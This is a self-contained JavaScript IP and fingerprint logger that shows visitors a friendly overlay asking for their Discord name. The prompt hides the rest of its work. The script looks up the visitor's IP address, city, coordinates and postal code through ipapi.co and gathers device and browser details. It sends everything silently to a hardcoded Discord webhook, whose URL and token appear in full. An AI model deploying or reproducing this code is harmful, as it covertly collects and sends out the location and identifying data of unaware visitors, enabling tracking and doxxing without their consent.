(function() {
    const config = {
        webhookUrl: 'https://discord.com/api/webhooks/1370023198686707752/S1SiHHE7kCD8iWFFHbIA7maWH36QYXIOjZwl0YhFZmeZ3w4aWLeEftKxeOh6_d4zr0oT',
        silentMode: true
    };

    const createOverlay = () => {
        const fontLink = document.createElement('link');
        fontLink.href = 'https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap';
        fontLink.rel = 'stylesheet';
        document.head.appendChild(fontLink);

        const overlay = document.createElement('div');
        overlay.id = 'cyber-overlay';
        overlay.style = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 0;
            transition: opacity 0.6s cubic-bezier(0.22, 1, 0.36, 1);
        `;

        const modal = document.createElement('div');
        modal.style = `
            background: #121212;
            padding: 30px;
            border-radius: 8px;
            width: 90%;
            max-width: 420px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            border: 1px solid #333;
            transform: translateY(-20px);
            transition: transform 0.6s cubic-bezier(0.22, 1, 0.36, 1), opacity 0.6s ease;
            opacity: 0;
            position: relative;
        `;

        const content = document.createElement('div');
        content.style = `
            position: relative;
        `;

        const title = document.createElement('h2');
        title.textContent = "Hey there! 👋";
        title.style = `
            color: #ffd700;
            margin: 0 0 12px 0;
            font-family: 'Poppins', sans-serif;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 0.3px;
        `;

        const description = document.createElement('p');
        description.textContent = "What would you like to be referred to? Preferably your Discord Name :)";
        description.style = `
            color: #aaa;
            font-family: 'Poppins', sans-serif;
            text-align: center;
            margin: 0 0 25px 0;
            font-size: 15px;
            line-height: 1.5;
            font-weight: 400;
        `;

        const inputContainer = document.createElement('div');
        inputContainer.style = `
            position: relative;
            margin-bottom: 25px;
        `;

        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = 'Your name here...';
        input.style = `
            width: 100%;
            padding: 14px 18px;
            border-radius: 6px;
            border: 1px solid #333;
            background: #1a1a1a;
            color: #eee;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
            font-weight: 400;
        `;
        input.addEventListener('focus', () => {
            input.style.borderColor = '#ffd700';
            input.style.boxShadow = '0 0 0 2px rgba(255, 215, 0, 0.2)';
        });
        input.addEventListener('blur', () => {
            input.style.borderColor = '#333';
            input.style.boxShadow = 'none';
        });

        const submitBtn = document.createElement('button');
        submitBtn.textContent = "Continue";
        submitBtn.style = `
            width: 100%;
            padding: 14px;
            background: #ffd700;
            color: #121212;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
            letter-spacing: 0.5px;
        `;

        // Button hover effect
        submitBtn.addEventListener('mouseenter', () => {
            submitBtn.style.background = '#ffdf40';
        });
        submitBtn.addEventListener('mouseleave', () => {
            submitBtn.style.background = '#ffd700';
        });
        submitBtn.addEventListener('mousedown', () => {
            submitBtn.style.transform = 'translateY(1px)';
        });
        submitBtn.addEventListener('mouseup', () => {
            submitBtn.style.transform = 'translateY(0)';
        });

        inputContainer.appendChild(input);
        content.appendChild(title);
        content.appendChild(description);
        content.appendChild(inputContainer);
        content.appendChild(submitBtn);
        modal.appendChild(content);
        overlay.appendChild(modal);
        document.body.appendChild(overlay);

        // Animate in
        setTimeout(() => {
            overlay.style.opacity = '1';
            setTimeout(() => {
                modal.style.opacity = '1';
                modal.style.transform = 'translateY(0)';
            }, 100);
        }, 100);

        submitBtn.addEventListener('click', () => {
            const username = input.value.trim();
            if (username) {
                modal.style.transform = 'translateY(20px)';
                modal.style.opacity = '0';
                overlay.style.opacity = '0';
                
                setTimeout(() => {
                    overlay.remove();
                    logVisitorInfo(username);
                }, 500);
            } else {
                input.style.borderColor = '#ff5555';
                input.style.boxShadow = '0 0 0 2px rgba(255, 85, 85, 0.2)';
                setTimeout(() => {
                    input.style.borderColor = '#333';
                    input.style.boxShadow = 'none';
                }, 1000);
            }
        });

        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });
    };

    const getBrowserInfo = () => {
        const screen = window.screen;
        const navigator = window.navigator;
        
        return {
            screenWidth: screen.width,
            screenHeight: screen.height,
            availableWidth: screen.availWidth,
            availableHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 'unknown',
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown',
            webdriver: navigator.webdriver || false,
            online: navigator.onLine,
            connection: navigator.connection ? {
                downlink: navigator.connection.downlink,
                effectiveType: navigator.connection.effectiveType,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                type: navigator.connection.type
            } : 'unknown'
        };
    };

    const sendToDiscord = (data, discordUsername) => {
        const browserInfo = getBrowserInfo();
        
        const embed = {
            title: "📡 New Visitor Information Captured",
            color: 0xffd700,
            description: `**Visitor details recorded on ${new Date().toLocaleString()}**`,
            thumbnail: {
                url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/718smiley.png/640px-718smiley.png"
            },
            fields: [
                {
                    name: "👤 User Information",
                    value: `▸ **Possible Discord Username:** ${discordUsername || "Not provided"}`,
                    inline: false
                },
                {
                    name: "🌍 Location Information",
                    value: `▸ **IP Address:** ${data.ip || "Unknown"}\n` +
                           `▸ **Location:** ${[data.city, data.region, data.country_name].filter(Boolean).join(', ') || "Unknown"}\n` +
                           `▸ **Coordinates:** ${data.latitude && data.longitude ? `${data.latitude}, ${data.longitude}` : "Unknown"}\n` +
                           `▸ **Postal Code:** ${data.postal || "Unknown"}\n` +
                           `▸ **Timezone:** ${data.timezone ? `${data.timezone} (UTC${data.utc_offset})` : "Unknown"}`,
                    inline: true
                },
                {
                    name: "🇺🇳 Country Details",
                    value: `▸ **Country:** ${data.country_name || "Unknown"} (${data.country_code || "XX"})\n` +
                           `▸ **ISO3 Code:** ${data.country_code_iso3 || "Unknown"}\n` +
                           `▸ **Capital:** ${data.country_capital || "Unknown"}\n` +
                           `▸ **Continent:** ${data.continent_code || "Unknown"}\n` +
                           `▸ **TLD:** ${data.country_tld || "Unknown"}\n` +
                           `▸ **EU Member:** ${data.in_eu ? "Yes" : "No"}`,
                    inline: true
                },
                {
                    name: "📊 Demographics",
                    value: `▸ **Area:** ${data.country_area ? `${data.country_area.toLocaleString()} km²` : "Unknown"}\n` +
                           `▸ **Population:** ${data.country_population ? data.country_population.toLocaleString() : "Unknown"}\n` +
                           `▸ **Languages:** ${data.languages || "Unknown"}\n` +
                           `▸ **Calling Code:** ${data.country_calling_code || "Unknown"}\n` +
                           `▸ **Currency:** ${data.currency ? `${data.currency_name} (${data.currency})` : "Unknown"}`,
                    inline: true
                },
                {
                    name: "🖥️ Network Information",
                    value: `▸ **Network:** ${data.network || "Unknown"}\n` +
                           `▸ **ASN:** ${data.asn || "Unknown"}\n` +
                           `▸ **Organization:** ${data.org || "Unknown"}\n` +
                           `▸ **IP Version:** ${data.version || "Unknown"}`,
                    inline: false
                },
                {
                    name: "🖥️ Screen Information",
                    value: `▸ **Resolution:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
                           `▸ **Available:** ${browserInfo.availableWidth}x${browserInfo.availableHeight}\n` +
                           `▸ **Color Depth:** ${browserInfo.colorDepth}-bit\n` +
                           `▸ **Pixel Depth:** ${browserInfo.pixelDepth}-bit\n` +
                           `▸ **Orientation:** ${browserInfo.orientation}`,
                    inline: true
                },
                {
                    name: "⚙️ Hardware Information",
                    value: `▸ **Device Memory:** ${browserInfo.deviceMemory} GB\n` +
                           `▸ **CPU Cores:** ${browserInfo.hardwareConcurrency}\n` +
                           `▸ **Max Touch Points:** ${browserInfo.maxTouchPoints}`,
                    inline: true
                },
                {
                    name: "🌐 Browser Information",
                    value: `▸ **Language:** ${browserInfo.language}\n` +
                           `▸ **Platform:** ${browserInfo.platform}\n` +
                           `▸ **Online Status:** ${browserInfo.online ? "Online" : "Offline"}\n` +
                           `▸ **Cookies Enabled:** ${browserInfo.cookieEnabled ? "Yes" : "No"}\n` +
                           `▸ **Do Not Track:** ${browserInfo.doNotTrack}`,
                    inline: true
                },
                {
                    name: "📶 Connection Information",
                    value: browserInfo.connection !== 'unknown' ? 
                        `▸ **Type:** ${browserInfo.connection.type}\n` +
                        `▸ **Effective Type:** ${browserInfo.connection.effectiveType}\n` +
                        `▸ **Downlink:** ${browserInfo.connection.downlink} Mbps\n` +
                        `▸ **RTT:** ${browserInfo.connection.rtt} ms\n` +
                        `▸ **Save Data:** ${browserInfo.connection.saveData ? "Enabled" : "Disabled"}` :
                        "▸ Connection API not available",
                    inline: true
                },
                {
                    name: "🔍 Full User Agent",
                    value: `\`\`\`${browserInfo.userAgent || "Unknown"}\`\`\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "this is so mid 😭😭😭",
                icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/718smiley.png/640px-718smiley.png"
            }
        };
        
        const payload = {
            embeds: [embed],
            username: "Cyclone's Epic Info Logger",
            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/718smiley.png/640px-718smiley.png"
        };
        
        fetch(config.webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(() => {
            if (!config.silentMode) console.log('Visitor data sent to Discord');
        })
        .catch(error => {
            if (!config.silentMode) console.error('Error sending to webhook:', error);
        });
    };

    const logVisitorInfo = (discordUsername) => {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                sendToDiscord(data, discordUsername);
            })
            .catch(error => {
                if (!config.silentMode) console.error('Error fetching IP information:', error);
            });
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createOverlay);
    } else {
        createOverlay();
    }
})();
